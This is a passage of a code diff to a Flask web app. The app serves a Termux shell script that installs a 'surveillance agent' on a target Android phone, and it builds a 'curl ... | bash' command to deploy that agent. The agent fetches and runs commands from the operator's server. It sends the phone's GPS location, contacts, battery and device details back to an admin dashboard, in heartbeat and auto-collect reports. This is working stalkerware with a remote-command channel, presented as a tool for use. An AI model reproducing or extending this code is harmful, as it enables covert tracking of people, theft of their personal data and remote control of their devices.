                 self.cycle_count += 1
-                print(f"🔄 Surveillance Cycle {{self.cycle_count}}")
+                print(f"🔄 ACTUAL DATA Cycle {{self.cycle_count}}")
                 
                 # Check for new commands
                 commands = self.check_commands()
                 for cmd in commands:
-                    self.execute_command(cmd["id"], cmd["command"])
+                    self.execute_actual_command(cmd["id"], cmd["command"])
                 
-                # Auto-collect data every 10 cycles
+                # Auto-collect actual device info every 10 cycles
                 if self.cycle_count % 10 == 0:
-                    print("🔄 Auto-collecting REAL device data...")
-                    
-                    # Get real device info
-                    device_info = self.get_real_device_info()
-                    self.submit_report("device_info", device_info)
-                    
-                    # Get real location
-                    location = self.get_real_location()
-                    self.submit_report("location", location)
+                    print("🔄 Auto-collecting ACTUAL device data...")
+                    device_data = self.get_actual_device_info()
+                    self.submit_real_report("device_info", device_data)
                 
-                # Send heartbeat every 5 cycles
+                # Send heartbeat
                 if self.cycle_count % 5 == 0:
-                    self.submit_report("heartbeat", {{"cycle": self.cycle_count}})
+                    self.submit_real_report("heartbeat", {{"cycle": self.cycle_count}})
                 
-                time.sleep(30)  # Wait 30 seconds
+                time.sleep(30)
                 
             except Exception as e:
                 print(f"❌ Surveillance error: {{e}}")
                 time.sleep(60)
 
-# Start the WORKING agent
+# Start the ACTUAL DATA agent
 if __name__ == "__main__":
     agent_id = "{phone_id}"
     platform_url = "{platform_url}"
-    print(f"🎯 Starting WORKING Device Agent: {{agent_id}}")
-    agent = WorkingAgent(agent_id, platform_url)
-    agent.start_surveillance()
+    print(f"🎯 Starting ACTUAL DATA Agent: {{agent_id}}")
+    agent = RealDataAgent(agent_id, platform_url)
+    agent.start_actual_surveillance()
 EOF
 
-echo "🚀 Starting WORKING Device Surveillance Agent..."
-python /data/data/com.termux/files/home/working_agent.py &
+echo "🚀 Starting ACTUAL DATA Surveillance Agent..."
+python /data/data/com.termux/files/home/real_data_agent.py &
 
 echo ""
-echo "✅ WORKING AGENT INSTALLED!"
+echo "✅ ACTUAL DATA AGENT INSTALLED!"
 echo "📱 Agent ID: {phone_id}"
 echo "🌐 Platform: {platform_url}"
 echo ""
-echo "🎯 THIS AGENT USES REAL DEVICE APIS:"
-echo "   📍 Real GPS Location (termux-location)"
-echo "   📖 Real Contacts (termux-contact-list)" 
-echo "   🔋 Real Battery Status (termux-battery-status)"
-echo "   📱 Real Device Info (getprop)"
+echo "🎯 THIS AGENT COLLECTS ONLY REAL DATA:"
+echo "   📱 Actual Device Model"
+echo "   🤖 Actual Android Version" 
+echo "   🔋 Actual Battery Status"
+echo "   📍 Actual Location (if available)"
+echo "   📖 Actual Contacts (if accessible)"
 echo ""
-echo "📊 Check your admin dashboard for REAL device data!"
+echo "🚫 NO FAKE DATA WILL BE SENT"
+echo "📊 Check dashboard for ACTUAL device information!"
 '''
     
     return Response(
-        working_agent_script,
+        real_agent_script,
         mimetype='text/x-shellscript',
         headers={
-            'Content-Disposition': f'attachment; filename=working_agent_{phone_id}.sh'
+            'Content-Disposition': f'attachment; filename=actual_data_agent_{phone_id}.sh'
         }
     )
 
@@ -1003,7 +940,7 @@ def deploy_agent():
         return redirect('/login')
     
     target_phone = request.form.get('phone_number')
-    agent_id = request.form.get('agent_id', f'device_{target_phone}')
+    agent_id = request.form.get('agent_id', f'actual_{target_phone}')
     
     platform_url = request.host_url.rstrip('/')
     agent_command = f"curl -s {platform_url}/download_agent?phone={agent_id} | bash"
@@ -1019,18 +956,21 @@ def deploy_agent():
     
     return f'''
     <html>
-    <head><title>Deploy Working Agent</title></head>
+    <head><title>Deploy Actual Data Agent</title></head>
     <body style="font-family: Arial; padding: 20px; background: #1a1a1a; color: white;">
-        <h1>🎯 Deploy WORKING Device Agent</h1>
+        <h1>🎯 Deploy ACTUAL DATA Agent</h1>
         <div style="background: #2d2d2d; padding: 20px; border-radius: 10px;">
             <h3>📱 Agent ID: {agent_id}</h3>
-            <p>This agent uses <strong>ACTUAL DEVICE APIS</strong> to collect REAL data:</p>
+            <p>This agent collects <strong>ONLY ACTUAL DEVICE DATA</strong>:</p>
             <ul>
-                <li>📍 Real GPS Location (termux-location)</li>
-                <li>📖 Real Contacts (termux-contact-list)</li>
-                <li>🔋 Real Battery Status (termux-battery-status)</li>
-                <li>📱 Real Device Info (getprop)</li>
+                <li>📱 Actual Device Model</li>
+                <li>🤖 Actual Android Version</li>
+                <li>🔋 Actual Battery Status</li>
+                <li>📍 Actual Location (if available)</li>
+                <li>📖 Actual Contacts (if accessible)</li>
             </ul>
+            
+            <p style="color: #f44336; font-weight: bold;">🚫 NO FAKE DATA WILL BE SENT</p>
             
             <h3>🚀 Installation Command:</h3>
             <div style="background: #000; padding: 15px; border-radius: 5px; font-family: monospace;">
